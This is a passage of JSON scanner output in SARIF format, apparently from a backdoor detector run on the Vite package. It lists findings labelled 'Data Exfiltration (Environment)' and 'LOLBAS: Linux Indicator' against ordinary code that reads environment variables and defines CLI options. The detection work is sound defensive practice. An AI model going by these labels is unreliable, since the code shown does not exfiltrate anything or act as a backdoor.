          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 1169,
                  "startColumn": 10,
                  "endLine": 1169,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\t\t */\n\n\t\tfunction load() {\n\t\t\treturn process.env.DEBUG;\n\t\t}\n\n\t\t/**\n",
                    "rendered": {
                      "text": "\t\t */\n\n\t\tfunction load() {\n\t\t\treturn process.env.DEBUG;\n\t\t}\n\n\t\t/**\n",
                      "markdown": "`\t\t */\n\n\t\tfunction load() {\n\t\t\treturn process.env.DEBUG;\n\t\t}\n\n\t\t/**\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 1157,
                  "startColumn": 11,
                  "endLine": 1157,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n\t\t\t\tdelete process.env.DEBUG;\n\t\t\t}\n\t\t}\n\n",
                    "rendered": {
                      "text": "\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n\t\t\t\tdelete process.env.DEBUG;\n\t\t\t}\n\t\t}\n\n",
                      "markdown": "`\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n\t\t\t\tdelete process.env.DEBUG;\n\t\t\t}\n\t\t}\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 1155,
                  "startColumn": 20,
                  "endLine": 1155,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\t\t\tif (namespaces) {\n\t\t\t\tprocess.env.DEBUG = namespaces;\n\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n\t\t\t\tdelete process.env.DEBUG;\n\t\t\t}\n",
                    "rendered": {
                      "text": "\t\t\tif (namespaces) {\n\t\t\t\tprocess.env.DEBUG = namespaces;\n\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n\t\t\t\tdelete process.env.DEBUG;\n\t\t\t}\n",
                      "markdown": "`\t\t\tif (namespaces) {\n\t\t\t\tprocess.env.DEBUG = namespaces;\n\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n\t\t\t\tdelete process.env.DEBUG;\n\t\t\t}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 1153,
                  "startColumn": 4,
                  "endLine": 1153,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\t\t */\n\t\tfunction save(namespaces) {\n\t\t\tif (namespaces) {\n\t\t\t\tprocess.env.DEBUG = namespaces;\n\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n",
                    "rendered": {
                      "text": "\t\t */\n\t\tfunction save(namespaces) {\n\t\t\tif (namespaces) {\n\t\t\t\tprocess.env.DEBUG = namespaces;\n\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n",
                      "markdown": "`\t\t */\n\t\tfunction save(namespaces) {\n\t\t\tif (namespaces) {\n\t\t\t\tprocess.env.DEBUG = namespaces;\n\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 1084,
                  "startColumn": 13,
                  "endLine": 1084,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\t\t\t\t});\n\n\t\t\t// Coerce string value into JS value\n\t\t\tlet val = process.env[key];\n\t\t\tif (/^(yes|on|true|enabled)$/i.test(val)) {\n\t\t\t\tval = true;\n\t\t\t} else if (/^(no|off|false|disabled)$/i.test(val)) {\n",
                    "rendered": {
                      "text": "\t\t\t\t});\n\n\t\t\t// Coerce string value into JS value\n\t\t\tlet val = process.env[key];\n\t\t\tif (/^(yes|on|true|enabled)$/i.test(val)) {\n\t\t\t\tval = true;\n\t\t\t} else if (/^(no|off|false|disabled)$/i.test(val)) {\n",
                      "markdown": "`\t\t\t\t});\n\n\t\t\t// Coerce string value into JS value\n\t\t\tlet val = process.env[key];\n\t\t\tif (/^(yes|on|true|enabled)$/i.test(val)) {\n\t\t\t\tval = true;\n\t\t\t} else if (/^(no|off|false|disabled)$/i.test(val)) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 1072,
                  "startColumn": 36,
                  "endLine": 1072,
                  "endColumn": 47,
                  "snippet": {
                    "text": "\t\t *   $ DEBUG_COLORS=no DEBUG_DEPTH=10 DEBUG_SHOW_HIDDEN=enabled node script.js\n\t\t */\n\n\t\texports.inspectOpts = Object.keys(process.env).filter(key => {\n\t\t\treturn /^debug_/i.test(key);\n\t\t}).reduce((obj, key) => {\n\t\t\t// Camel-case\n",
                    "rendered": {
                      "text": "\t\t *   $ DEBUG_COLORS=no DEBUG_DEPTH=10 DEBUG_SHOW_HIDDEN=enabled node script.js\n\t\t */\n\n\t\texports.inspectOpts = Object.keys(process.env).filter(key => {\n\t\t\treturn /^debug_/i.test(key);\n\t\t}).reduce((obj, key) => {\n\t\t\t// Camel-case\n",
                      "markdown": "`\t\t *   $ DEBUG_COLORS=no DEBUG_DEPTH=10 DEBUG_SHOW_HIDDEN=enabled node script.js\n\t\t */\n\n\t\texports.inspectOpts = Object.keys(process.env).filter(key => {\n\t\t\treturn /^debug_/i.test(key);\n\t\t}).reduce((obj, key) => {\n\t\t\t// Camel-case\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 894,
                  "startColumn": 8,
                  "endLine": 894,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\n\t\t\t// If debug isn't set in LS, and we're in Electron, try to load $DEBUG\n\t\t\tif (!r && typeof process !== 'undefined' && 'env' in process) {\n\t\t\t\tr = process.env.DEBUG;\n\t\t\t}\n\n\t\t\treturn r;\n",
                    "rendered": {
                      "text": "\n\t\t\t// If debug isn't set in LS, and we're in Electron, try to load $DEBUG\n\t\t\tif (!r && typeof process !== 'undefined' && 'env' in process) {\n\t\t\t\tr = process.env.DEBUG;\n\t\t\t}\n\n\t\t\treturn r;\n",
                      "markdown": "`\n\t\t\t// If debug isn't set in LS, and we're in Electron, try to load $DEBUG\n\t\t\tif (!r && typeof process !== 'undefined' && 'env' in process) {\n\t\t\t\tr = process.env.DEBUG;\n\t\t\t}\n\n\t\t\treturn r;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 135,
                  "startColumn": 7,
                  "endLine": 135,
                  "endColumn": 18,
                  "snippet": {
                    "text": "var picocolors = {exports: {}};\n\nlet argv = process.argv || [],\n\tenv = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env ||\n",
                    "rendered": {
                      "text": "var picocolors = {exports: {}};\n\nlet argv = process.argv || [],\n\tenv = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env ||\n",
                      "markdown": "`var picocolors = {exports: {}};\n\nlet argv = process.argv || [],\n\tenv = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env ||\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6142,
                  "startColumn": 6,
                  "endLine": 6142,
                  "endColumn": 19,
                  "snippet": {
                    "text": "  envPrefix = \"VITE_\"\n}) {\n  envPrefix = arraify(envPrefix);\n  if (envPrefix.includes(\"\")) {\n    throw new Error(\n      `envPrefix option contains value '', which could lead unexpected exposure of sensitive information.`\n    );\n",
                    "rendered": {
                      "text": "  envPrefix = \"VITE_\"\n}) {\n  envPrefix = arraify(envPrefix);\n  if (envPrefix.includes(\"\")) {\n    throw new Error(\n      `envPrefix option contains value '', which could lead unexpected exposure of sensitive information.`\n    );\n",
                      "markdown": "`  envPrefix = \"VITE_\"\n}) {\n  envPrefix = arraify(envPrefix);\n  if (envPrefix.includes(\"\")) {\n    throw new Error(\n      `envPrefix option contains value '', which could lead unexpected exposure of sensitive information.`\n    );\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6108,
                  "startColumn": 8,
                  "endLine": 6108,
                  "endColumn": 22,
                  "snippet": {
                    "text": "  }\n  prefixes = arraify(prefixes);\n  const env = {};\n  const envFiles = getEnvFilesForMode(mode, envDir);\n  const parsed = Object.fromEntries(\n    envFiles.flatMap((filePath) => {\n      if (!tryStatSync(filePath)?.isFile()) return [];\n",
                    "rendered": {
                      "text": "  }\n  prefixes = arraify(prefixes);\n  const env = {};\n  const envFiles = getEnvFilesForMode(mode, envDir);\n  const parsed = Object.fromEntries(\n    envFiles.flatMap((filePath) => {\n      if (!tryStatSync(filePath)?.isFile()) return [];\n",
                      "markdown": "`  }\n  prefixes = arraify(prefixes);\n  const env = {};\n  const envFiles = getEnvFilesForMode(mode, envDir);\n  const parsed = Object.fromEntries(\n    envFiles.flatMap((filePath) => {\n      if (!tryStatSync(filePath)?.isFile()) return [];\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5911,
                  "startColumn": 53,
                  "endLine": 5911,
                  "endColumn": 99,
                  "snippet": {
                    "text": "\n  // dotenvKey exists but .env.vault file does not exist\n  if (!vaultPath) {\n    _warn(`You set DOTENV_KEY but you are missing a .env.vault file at ${vaultPath}. Did you forget to build it?`);\n\n    return DotenvModule.configDotenv(options)\n  }\n",
                    "rendered": {
                      "text": "\n  // dotenvKey exists but .env.vault file does not exist\n  if (!vaultPath) {\n    _warn(`You set DOTENV_KEY but you are missing a .env.vault file at ${vaultPath}. Did you forget to build it?`);\n\n    return DotenvModule.configDotenv(options)\n  }\n",
                      "markdown": "`\n  // dotenvKey exists but .env.vault file does not exist\n  if (!vaultPath) {\n    _warn(`You set DOTENV_KEY but you are missing a .env.vault file at ${vaultPath}. Did you forget to build it?`);\n\n    return DotenvModule.configDotenv(options)\n  }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5875,
                  "startColumn": 24,
                  "endLine": 5875,
                  "endColumn": 67,
                  "snippet": {
                    "text": "  for (const path of optionPaths) {\n    try {\n      // Specifying an encoding returns a string instead of a buffer\n      const parsed = DotenvModule.parse(fs.readFileSync(path, { encoding }));\n\n      DotenvModule.populate(parsedAll, parsed, options);\n    } catch (e) {\n",
                    "rendered": {
                      "text": "  for (const path of optionPaths) {\n    try {\n      // Specifying an encoding returns a string instead of a buffer\n      const parsed = DotenvModule.parse(fs.readFileSync(path, { encoding }));\n\n      DotenvModule.populate(parsedAll, parsed, options);\n    } catch (e) {\n",
                      "markdown": "`  for (const path of optionPaths) {\n    try {\n      // Specifying an encoding returns a string instead of a buffer\n      const parsed = DotenvModule.parse(fs.readFileSync(path, { encoding }));\n\n      DotenvModule.populate(parsedAll, parsed, options);\n    } catch (e) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5829,
                  "startColumn": 16,
                  "endLine": 5829,
                  "endColumn": 28,
                  "snippet": {
                    "text": "}\n\nfunction _configVault (options) {\n  _log('Loading env from encrypted .env.vault');\n\n  const parsed = DotenvModule._parseVault(options);\n\n",
                    "rendered": {
                      "text": "}\n\nfunction _configVault (options) {\n  _log('Loading env from encrypted .env.vault');\n\n  const parsed = DotenvModule._parseVault(options);\n\n",
                      "markdown": "`}\n\nfunction _configVault (options) {\n  _log('Loading env from encrypted .env.vault');\n\n  const parsed = DotenvModule._parseVault(options);\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5781,
                  "startColumn": 8,
                  "endLine": 5781,
                  "endColumn": 42,
                  "snippet": {
                    "text": "  }\n\n  // Get environment\n  const environment = uri.searchParams.get('environment');\n  if (!environment) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing environment part');\n    err.code = 'INVALID_DOTENV_KEY';\n",
                    "rendered": {
                      "text": "  }\n\n  // Get environment\n  const environment = uri.searchParams.get('environment');\n  if (!environment) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing environment part');\n    err.code = 'INVALID_DOTENV_KEY';\n",
                      "markdown": "`  }\n\n  // Get environment\n  const environment = uri.searchParams.get('environment');\n  if (!environment) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing environment part');\n    err.code = 'INVALID_DOTENV_KEY';\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 1155,
                  "startColumn": 28,
                  "endLine": 1155,
                  "endColumn": 66,
                  "snippet": {
                    "text": "\t\t\tif (namespaces) {\n\t\t\t\tprocess.env.DEBUG = namespaces;\n\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n\t\t\t\tdelete process.env.DEBUG;\n\t\t\t}\n",
                    "rendered": {
                      "text": "\t\t\tif (namespaces) {\n\t\t\t\tprocess.env.DEBUG = namespaces;\n\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n\t\t\t\tdelete process.env.DEBUG;\n\t\t\t}\n",
                      "markdown": "`\t\t\tif (namespaces) {\n\t\t\t\tprocess.env.DEBUG = namespaces;\n\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n\t\t\t\tdelete process.env.DEBUG;\n\t\t\t}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 523,
                  "startColumn": 6,
                  "endLine": 523,
                  "endColumn": 57,
                  "snippet": {
                    "text": "\t\t\t\t}\n\t\t\t});\n\n\t\t\t// Env-specific initialization logic for debug instances\n\t\t\tif (typeof createDebug.init === 'function') {\n\t\t\t\tcreateDebug.init(debug);\n\t\t\t}\n",
                    "rendered": {
                      "text": "\t\t\t\t}\n\t\t\t});\n\n\t\t\t// Env-specific initialization logic for debug instances\n\t\t\tif (typeof createDebug.init === 'function') {\n\t\t\t\tcreateDebug.init(debug);\n\t\t\t}\n",
                      "markdown": "`\t\t\t\t}\n\t\t\t});\n\n\t\t\t// Env-specific initialization logic for debug instances\n\t\t\tif (typeof createDebug.init === 'function') {\n\t\t\t\tcreateDebug.init(debug);\n\t\t\t}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 137,
                  "startColumn": 17,
                  "endLine": 137,
                  "endColumn": 32,
                  "snippet": {
                    "text": "let argv = process.argv || [],\n\tenv = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env ||\n\t\targv.includes(\"--color\") ||\n\t\tprocess.platform === \"win32\" ||\n",
                    "rendered": {
                      "text": "let argv = process.argv || [],\n\tenv = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env ||\n\t\targv.includes(\"--color\") ||\n\t\tprocess.platform === \"win32\" ||\n",
                      "markdown": "`let argv = process.argv || [],\n\tenv = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env ||\n\t\targv.includes(\"--color\") ||\n\t\tprocess.platform === \"win32\" ||\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/index.js"
                },
                "region": {
                  "startLine": 73,
                  "startColumn": 16,
                  "endLine": 73,
                  "endColumn": 21,
                  "snippet": {
                    "text": "}\nfunction staticImportedByEntry(id, getModuleInfo, cache, importStack = []) {\n  if (cache.has(id)) {\n    return cache.get(id);\n  }\n  if (importStack.includes(id)) {\n    cache.set(id, false);\n",
                    "rendered": {
                      "text": "}\nfunction staticImportedByEntry(id, getModuleInfo, cache, importStack = []) {\n  if (cache.has(id)) {\n    return cache.get(id);\n  }\n  if (importStack.includes(id)) {\n    cache.set(id, false);\n",
                      "markdown": "`}\nfunction staticImportedByEntry(id, getModuleInfo, cache, importStack = []) {\n  if (cache.has(id)) {\n    return cache.get(id);\n  }\n  if (importStack.includes(id)) {\n    cache.set(id, false);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/cli.js"
                },
                "region": {
                  "startLine": 810,
                  "startColumn": 24,
                  "endLine": 810,
                  "endColumn": 32,
                  "snippet": {
                    "text": "  `[string] directory under outDir to place assets in (default: assets)`\n).option(\n  \"--assetsInlineLimit <number>\",\n  `[number] static asset base64 inline threshold in bytes (default: 4096)`\n).option(\n  \"--ssr [entry]\",\n  `[string] build specified entry for server-side rendering`\n",
                    "rendered": {
                      "text": "  `[string] directory under outDir to place assets in (default: assets)`\n).option(\n  \"--assetsInlineLimit <number>\",\n  `[number] static asset base64 inline threshold in bytes (default: 4096)`\n).option(\n  \"--ssr [entry]\",\n  `[string] build specified entry for server-side rendering`\n",
                      "markdown": "`  `[string] directory under outDir to place assets in (default: assets)`\n).option(\n  \"--assetsInlineLimit <number>\",\n  `[number] static asset base64 inline threshold in bytes (default: 4096)`\n).option(\n  \"--ssr [entry]\",\n  `[string] build specified entry for server-side rendering`\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/cli.js"
                },
                "region": {
                  "startLine": 727,
                  "startColumn": 324,
                  "endLine": 727,
                  "endColumn": 329,
                  "snippet": {
                    "text": "l <level>\", `[string] info | warn | error | silent`).option(\"--clearScreen\", `[boolean] allow/disable clear screen when logging`).option(\"-d, --debug [feat]\", `[string | boolean] show debug logs`).option(\"-f, --filter <filter>\", `[string] filter debug logs`).option(\"-m, --mode <mode>\", `[string] set env mode`);\ncli.command(\"[root]\", \"start dev server\").alias(\"serve\").alias(\"dev\").option(\"--host [host]\", `[string] specify hostname`, { type: [convertHost] }).option(\"--port <port>\", `[number] specify port`).option(\"--open [path]\", `[boolean | string] open browser on startup`).option(\"--cors\", `[boolea",
                    "rendered": {
                      "text": "l <level>\", `[string] info | warn | error | silent`).option(\"--clearScreen\", `[boolean] allow/disable clear screen when logging`).option(\"-d, --debug [feat]\", `[string | boolean] show debug logs`).option(\"-f, --filter <filter>\", `[string] filter debug logs`).option(\"-m, --mode <mode>\", `[string] set env mode`);\ncli.command(\"[root]\", \"start dev server\").alias(\"serve\").alias(\"dev\").option(\"--host [host]\", `[string] specify hostname`, { type: [convertHost] }).option(\"--port <port>\", `[number] specify port`).option(\"--open [path]\", `[boolean | string] open browser on startup`).option(\"--cors\", `[boolea",
                      "markdown": "`l <level>\", `[string] info | warn | error | silent`).option(\"--clearScreen\", `[boolean] allow/disable clear screen when logging`).option(\"-d, --debug [feat]\", `[string | boolean] show debug logs`).option(\"-f, --filter <filter>\", `[string] filter debug logs`).option(\"-m, --mode <mode>\", `[string] set env mode`);\ncli.command(\"[root]\", \"start dev server\").alias(\"serve\").alias(\"dev\").option(\"--host [host]\", `[string] specify hostname`, { type: [convertHost] }).option(\"--port <port>\", `[number] specify port`).option(\"--open [path]\", `[boolean | string] open browser on startup`).option(\"--cors\", `[boolea`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/cli.js"
                },
                "region": {
                  "startLine": 727,
                  "startColumn": 131,
                  "endLine": 727,
                  "endColumn": 139,
                  "snippet": {
                    "text": " v;\n};\ncli.option(\"-c, --config <file>\", `[string] use specified config file`).option(\"--base <path>\", `[string] public base path (default: /)`, {\n  type: [convertBase]\n}).option(\"-l, --logLevel <level>\", `[string] info | warn | error | silent`).option(\"--clearScreen\", `[boolean] allow/disable clear screen when logging`).option(\"-d, --debug [feat]\", `[string | boolean] show debug logs`).option(\"-f, --filter <filter>\", `[string] filter debug logs`).option(\"-m, --mode <mode>\", `[string] set env mode`);\ncli.command(\"[root]\", \"start dev server\").alias(\"serve\").alias(\"dev\").option(\"--host [host]\", `[string",
                    "rendered": {
